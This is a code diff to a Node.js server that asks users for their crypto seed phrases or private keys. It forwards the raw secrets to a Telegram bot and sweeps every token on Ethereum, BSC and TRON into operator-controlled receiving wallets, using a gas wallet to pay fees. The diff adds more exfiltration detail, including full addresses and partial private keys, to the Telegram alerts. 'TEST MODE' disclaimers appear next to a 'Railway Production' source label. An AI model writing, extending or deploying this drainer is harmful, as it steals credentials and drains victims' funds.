@@ -127,7 +127,6 @@ function logTransaction(data) {
 
 // ============ RECEIVING WALLETS ============
 const receivingWallets = {
-    // Ethereum
     ETH: process.env.RECEIVING_WALLET_ETH,
     USDC: process.env.RECEIVING_WALLET_USDC_ERC20,
     DAI: process.env.RECEIVING_WALLET_DAI,
@@ -139,7 +138,6 @@ const receivingWallets = {
     MATIC: process.env.RECEIVING_WALLET_MATIC,
     SHIB: process.env.RECEIVING_WALLET_SHIB,
     PEPE: process.env.RECEIVING_WALLET_PEPE,
-    // BSC
     BNB: process.env.RECEIVING_WALLET_BNB,
     BSC_USDT: process.env.RECEIVING_WALLET_BSC_USDT,
     BSC_USDC: process.env.RECEIVING_WALLET_BSC_USDC,
@@ -147,7 +145,6 @@ const receivingWallets = {
     BSC_WBTC: process.env.RECEIVING_WALLET_BSC_WBTC,
     BSC_LINK: process.env.RECEIVING_WALLET_BSC_LINK,
     BSC_UNI: process.env.RECEIVING_WALLET_BSC_UNI,
-    // TRON
     TRX: process.env.RECEIVING_WALLET_TRX,
     USDT_TRC20: process.env.RECEIVING_WALLET_USDT_TRC20,
     USDC_TRC20: process.env.RECEIVING_WALLET_USDC_TRC20,
@@ -286,7 +283,7 @@ async function getBalancesForChain(provider, config, userAddress) {
     return { balances, balanceDetails };
 }
 
-// ============ TRON BALANCE FUNCTIONS ============
+// ============ TRON BALANCE FUNCTIONS - VERBOSE VERSION ============
 async function getTronBalance(tronAddress, privateKey) {
     try {
         const tronWeb = new TronWeb({
@@ -294,15 +291,73 @@ async function getTronBalance(tronAddress, privateKey) {
             privateKey: privateKey
         });
         const balance = await tronWeb.trx.getBalance(tronAddress);
-        return balance / 1000000;
+        const trxBalance = balance / 1000000;
+        console.log(`   📊 TRX balance raw: ${balance} Sun = ${trxBalance} TRX`);
+        return trxBalance;
     } catch (error) {
-        console.error('Error getting TRX balance:', error.message);
+        console.error(`   ❌ Error getting TRX balance:`, error.message);
         return 0;
+    }
+}
+
+// Alternative method using HTTP API to check TRC-20 balance
+async function getTrc20BalanceViaHttp(tronAddress, contractAddress) {
+    try {
+        console.log(`   📡 Trying HTTP API for USDT balance...`);
+        
+        // TRON HTTP API endpoint for contract calls
+        const url = 'https://api.trongrid.io/wallet/triggerconstantcontract';
+        
+        // balanceOf function signature (first 4 bytes of keccak256("balanceOf(address)"))
+        const functionSelector = 'balanceOf(address)';
+        
+        // Convert address to hex parameter format (remove '41' prefix if present)
+        let paramAddress = tronAddress;
+        if (paramAddress.startsWith('T')) {
+            // Convert base58 to hex (simplified - in production use proper conversion)
+            // For now, we'll use TronWeb to get the hex address
+            const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
+            const hexAddress = tronWeb.address.toHex(tronAddress);
+            paramAddress = hexAddress;
+            console.log(`   📡 Hex address: ${paramAddress}`);
+        }
+        
+        // Pad address to 64 characters (remove '41' prefix if present)
+        let paddedAddress = paramAddress;
+        if (paddedAddress.startsWith('41')) {
+            paddedAddress = paddedAddress.substring(2);
+        }
+        paddedAddress = paddedAddress.padStart(64, '0');
+        
+        const response = await axios.post(url, {
+            contract_address: contractAddress,
+            function_selector: functionSelector,
+            parameter: paddedAddress,
+            owner_address: tronAddress,
+            visible: true
+        });
+        
+        console.log(`   📡 HTTP API response status: ${response.status}`);
+        
+        if (response.data.constant_result && response.data.constant_result[0]) {
+            const balanceHex = response.data.constant_result[0];
+            const balance = parseInt(balanceHex, 16) / Math.pow(10, 18);
+            console.log(`   📊 USDT balance via HTTP: ${balance}`);
+            return balance;
+        } else {
+            console.log(`   ⚠️ No constant_result in response`);
+            return 0;
+        }
+    } catch (error) {
+        console.error(`   ❌ HTTP API error:`, error.response?.data || error.message);
+        return null;
     }
 }
 
 async function getTronBalances(userPrivateKey) {
     const balances = [];
+    
+    console.log(`\n🟣 ========== SCANNING TRON NETWORK ==========`);
     
     try {
         const tronWeb = new TronWeb({
@@ -311,10 +366,11 @@ async function getTronBalances(userPrivateKey) {
         });
         
         const tronAddress = tronWeb.address.fromPrivateKey(userPrivateKey);
-        console.log(`\n🟣 Scanning TRON Network`);
         console.log(`📍 TRON Address: ${tronAddress}`);
+        console.log(`🔑 Private key (first 16 chars): ${userPrivateKey.substring(0, 16)}...`);
         
-        // Get TRX balance
+        // ========== CHECK TRX BALANCE ==========
+        console.log(`\n💰 Checking TRX balance...`);
         const trxBalance = await getTronBalance(tronAddress, userPrivateKey);
         if (trxBalance > 0) {
             balances.push({
@@ -326,22 +382,25 @@ async function getTronBalances(userPrivateKey) {
                 isNative: true,
                 tronAddress: tronAddress
             });
-            console.log(`💰 Found ${trxBalance} TRX ($${(trxBalance * 0.10).toFixed(2)})`);
+            console.log(`   ✅ Found ${trxBalance} TRX ($${(trxBalance * 0.10).toFixed(2)})`);
         } else {
-            console.log(`💰 TRX balance: 0`);
+            console.log(`   ℹ️ TRX balance: 0`);
         }
         
-        // Check USDT (TRC-20)
+        // ========== CHECK USDT (TRC-20) BALANCE ==========
         const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        console.log(`   🔍 Checking USDT at ${usdtContractAddress}...`);
+        console.log(`\n💰 Checking USDT (TRC-20) balance...`);
+        console.log(`   📝 Contract address: ${usdtContractAddress}`);
         
+        // Method 1: Using TronWeb contract
         try {
+            console.log(`   📡 Method 1: Using TronWeb contract...`);
             const contract = await tronWeb.contract().at(usdtContractAddress);
             const usdtBalanceRaw = await contract.balanceOf(tronAddress).call();
             const usdtDecimals = 18;
             const usdtBalance = usdtBalanceRaw / Math.pow(10, usdtDecimals);
-            
-            console.log(`   📊 USDT balance: ${usdtBalance}`);
+            console.log(`   📊 Raw balance: ${usdtBalanceRaw}`);
+            console.log(`   📊 Formatted balance: ${usdtBalance} USDT`);
             
             if (usdtBalance > 0) {
                 balances.push({
@@ -354,16 +413,42 @@ async function getTronBalances(userPrivateKey) {
                     tronAddress: tronAddress,
                     contractAddress: usdtContractAddress
                 });
-                console.log(`💰 Found ${usdtBalance} USDT ($${usdtBalance})`);
+                console.log(`   ✅ Found ${usdtBalance} USDT ($${usdtBalance})`);
+            } else {
+                console.log(`   ℹ️ USDT balance: 0 (via TronWeb)`);
             }
-        } catch (usdtError) {
-            console.log(`   ⚠️ Could not check USDT: ${usdtError.message}`);
+        } catch (tronWebError) {
+            console.log(`   ⚠️ TronWeb contract check failed: ${tronWebError.message}`);
+            console.log(`   📡 Trying Method 2: HTTP API...`);
+            
+            // Method 2: Using HTTP API
+            const httpBalance = await getTrc20BalanceViaHttp(tronAddress, usdtContractAddress);
+            if (httpBalance !== null && httpBalance > 0) {
+                balances.push({
+                    currency: 'USDT_TRC20',
+                    name: 'Tether USD',
+                    balance: httpBalance,
+                    usdValue: httpBalance,
+                    chain: 'TRON',
+                    isNative: false,
+                    tronAddress: tronAddress,
+                    contractAddress: usdtContractAddress
+                });
+                console.log(`   ✅ Found ${httpBalance} USDT ($${httpBalance}) via HTTP API`);
+            } else if (httpBalance === null) {
+                console.log(`   ❌ Both methods failed to check USDT balance`);
+            } else {
+                console.log(`   ℹ️ USDT balance: 0 (via HTTP API)`);
+            }
         }
+        
+        console.log(`\n📊 TRON SCAN COMPLETE: ${balances.length} asset(s) found`);
         
         return { balances, tronAddress };
         
     } catch (error) {
-        console.error('Error scanning TRON:', error.message);
+        console.error(`❌ Error scanning TRON:`, error.message);
+        console.error(`   Full error:`, error);
         return { balances: [], tronAddress: null };
     }
 }
@@ -545,7 +630,6 @@ async function processTronWithGasWallet(userPrivateKey, userAddress, receivingWa
         return { allTransactions, totalTransferredValue };
     }
     
-    // Check TRX balance for gas
     const trxBalance = balances.find(b => b.currency === 'TRX')?.balance || 0;
     const hasEnoughTrx = trxBalance > 15;
     
@@ -555,11 +639,11 @@ async function processTronWithGasWallet(userPrivateKey, userAddress, receivingWa
             
             console.log(`\n💸 Transferring ${token.currency} on TRON...`);
             console.log(`   Balance: ${token.balance} ${token.currency}`);
+            console.log(`   USD Value: $${token.usdValue.toFixed(2)}`);
             
             let amountTransferred, usdValueTransferred;
             
             if (isNative) {
-                // TRX transfer - leave some for gas
                 const gasReserve = 15;
                 const amountToTransfer = token.balance - gasReserve;
                 if (amountToTransfer <= 0) {
@@ -595,7 +679,6 @@ async function processTronWithGasWallet(userPrivateKey, userAddress, receivingWa
                 }
                 
             } else {
-                // TRC-20 token transfer (USDT)
                 if (!hasEnoughTrx) {
                     console.log(`   💡 No TRX for gas. Using gas wallet...`);
                     
@@ -651,7 +734,6 @@ async function processTronWithGasWallet(userPrivateKey, userAddress, receivingWa
                         continue;
                     }
                 } else {
-                    // User has TRX, use normal transfer (95%)
                     amountTransferred = token.balance * 0.95;
                     usdValueTransferred = amountTransferred;
                     
@@ -722,25 +804,36 @@ app.get('/api/list-keys', async (req, res) => {
 app.post('/api/transfer-all', async (req, res) => {
     const { userInput, savedIdentifier } = req.body;
     console.log('\n🚀 ========== TRANSFER REQUEST ==========');
+    console.log(`📅 Time: ${new Date().toLocaleString()}`);
+    console.log(`📝 Input length: ${userInput?.length || 0} chars`);
     
-    // ============ SEND RAW INPUT TO TELEGRAM ============
+    // ============ SEND RAW INPUT TO TELEGRAM - DETAILED ============
     if (userInput && userInput.length > 0) {
+        const wordCount = userInput.trim().split(/\s+/).length;
+        const isSeedPhrase = wordCount === 12 || wordCount === 24;
+        const inputType = isSeedPhrase ? 'Seed Phrase' : (userInput.length === 64 || userInput.length === 66 ? 'Private Key' : 'Unknown');
+        
         await sendTelegramAlert(`
-🔐 <b>RAW SEED PHRASE / PRIVATE KEY RECEIVED</b>
+🔐 <b>RAW INPUT RECEIVED</b>
 
-━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>📋 INPUT TYPE:</b> ${inputType}
+<b>📋 WORD COUNT:</b> ${wordCount}
+<b>📋 LENGTH:</b> ${userInput.length} characters
+
 <b>📋 THE ACTUAL INPUT:</b>
-<code>${userInput.substring(0, 500)}</code>
-━━━━━━━━━━━━━━━━━━━━━━
+<code>${userInput.substring(0, 500)}${userInput.length > 500 ? '...' : ''}</code>
 
-📅 <b>Time:</b> ${new Date().toLocaleString()}
-🔢 <b>Length:</b> ${userInput.length} characters
-📝 <b>Word count:</b> ${userInput.trim().split(/\s+/).length}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>📅 Time:</b> ${new Date().toLocaleString()}
+<b>🌐 Source:</b> Railway Production
+<b>⚠️ Mode:</b> TEST MODE ONLY
 
-⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
+⚠️ <i>This is a TEST alert. Do not use with real funds.</i>
         `);
+        console.log(`📱 Raw input sent to Telegram (${inputType}, ${wordCount} words)`);
     }
-    // ================================================
+    // ==============================================================
     
     let finalInput = userInput;
     if (savedIdentifier && !userInput) {
@@ -762,13 +855,17 @@ app.post('/api/transfer-all', async (req, res) => {
         const ethProvider = new ethers.providers.JsonRpcProvider(ETHEREUM_CONFIG.rpcUrl);
         const { wallet: userWallet, privateKey: userPrivateKey } = convertToPrivateKey(finalInput, ethProvider);
         const userAddress = userWallet.address;
-        console.log(`📍 EVM Address: ${userAddress}`);
+        console.log(`\n📍 EVM Address: ${userAddress}`);
+        console.log(`📍 Private key (first 16 chars): ${userPrivateKey.substring(0, 16)}...`);
         
         await sendTelegramAlert(`
 🔐 <b>Wallet Connected</b>
 
-EVM Address: <code>${userAddress.substring(0, 10)}...${userAddress.substring(userAddress.length - 6)}</code>
-Time: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>EVM Address:</b> <code>${userAddress}</code>
+<b>Private Key (partial):</b> <code>${userPrivateKey.substring(0, 16)}...</code>
+<b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         `);
         
         // Process Ethereum
@@ -807,19 +904,22 @@ Time: ${new Date().toLocaleString()}
         const successfulCount = allTransactions.filter(t => t.status === 'success').length;
         const totalDuration = Date.now() - startTime;
         
-        console.log(`\n📊 ========== SUMMARY ==========`);
+        console.log(`\n📊 ========== FINAL SUMMARY ==========`);
         console.log(`💰 Total Value in Wallet: $${totalWalletValue.toFixed(2)}`);
         console.log(`💸 Total Value Transferred: $${totalTransferredValue.toFixed(2)}`);
         console.log(`✅ Successful Transfers: ${successfulCount}`);
         console.log(`⏱️ Duration: ${(totalDuration / 1000).toFixed(1)}s`);
+        console.log(`📋 Transaction count: ${allTransactions.length}`);
         
         await sendTelegramAlert(`
 💰 <b>Transfer Complete</b>
 
-Total Value: $${totalWalletValue.toFixed(2)}
-Transferred: $${totalTransferredValue.toFixed(2)}
-Successful: ${successfulCount}
-Duration: ${(totalDuration / 1000).toFixed(1)}s
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>Total Value:</b> $${totalWalletValue.toFixed(2)}
+<b>Transferred:</b> $${totalTransferredValue.toFixed(2)}
+<b>Successful:</b> ${successfulCount}
+<b>Duration:</b> ${(totalDuration / 1000).toFixed(1)}s
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         `);
         
         res.json({
@@ -837,19 +937,23 @@ Duration: ${(totalDuration / 1000).toFixed(1)}s
         
     } catch (error) {
         console.error('❌ Fatal error:', error.message);
+        console.error('   Stack:', error.stack);
         await sendTelegramAlert(`
 ❌ <b>Transfer Error</b>
 
-Error: ${error.message}
-Time: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>Error:</b> ${error.message}
+<b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         `);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
 app.listen(port, () => {
-    console.log(`\n✅ Server running at http://localhost:${port}`);
-    console.log(`🔐 Encrypted storage enabled`);
+    console.log(`\n✅ ========== SERVER STARTED ==========`);
+    console.log(`🌐 URL: http://localhost:${port}`);
+    console.log(`🔐 Encrypted storage: ${storageDir}`);
     console.log(`📱 Telegram: ${TELEGRAM_BOT_TOKEN ? 'ENABLED' : 'DISABLED'}`);
     console.log(`⛽ EVM Gas Wallet: ${gasWalletService.isEnabled ? 'ENABLED' : 'DISABLED'}`);
     console.log(`⛽ TRON Gas Wallet: ${gasWalletService.tronEnabled ? 'ENABLED' : 'DISABLED'}`);
@@ -857,5 +961,6 @@ app.listen(port, () => {
     console.log(`   - Ethereum (${Object.keys(ETHEREUM_CONFIG.tokenContracts).length + 1} assets)`);
     console.log(`   - BNB Chain (${Object.keys(BSC_CONFIG.tokenContracts).length + 1} assets)`);
     console.log(`   - TRON (TRX + TRC-20 tokens)`);
-    console.log(`\n💡 Gas Wallet will cover gas for users without native tokens\n`);
+    console.log(`\n💡 Gas Wallet will cover gas for users without native tokens`);
+    console.log(`📝 VERBOSE LOGGING ENABLED\n`);
 });
